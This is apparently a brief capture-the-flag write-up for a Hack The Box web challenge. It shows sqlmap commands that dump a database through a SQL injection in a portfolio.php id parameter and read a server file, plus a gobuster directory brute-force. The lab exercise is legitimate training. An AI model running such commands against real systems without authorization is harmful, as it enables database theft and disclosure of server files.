# HTB_Freelance_Web_Challenge_Solution

open Website 
![Open Website](/host.png)

Then right click and Select Source code
![Then right click and Select Source code](/Page_Source.png)

try Sql injection
![Then right click and Select Source code](/link.png)

Enumeration using sqlmap tool
  
  sqlmap -u http://docker.hackthebox.eu:31569/portfolio.php?id=1 --dump --batch
![Then right click and Select Source code](/sqlmap2.png)
![Directory Brute-force using gobuster](/sqlmap1.png)

gobuster dir -u http://docker.hackthebox.eu:31569/ -w /usr/share/wordlists/dirb/common.txt 
![Directory Brute-force using gobuster](/directort1.png)


Read the file in server using sqlmap 
sqlmap -u http://docker.hackthebox.eu:31569/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php --dump --batch
![Directory Brute-force using gobuster](/output.png)
![Directory Brute-force using gobuster](/output2.png)

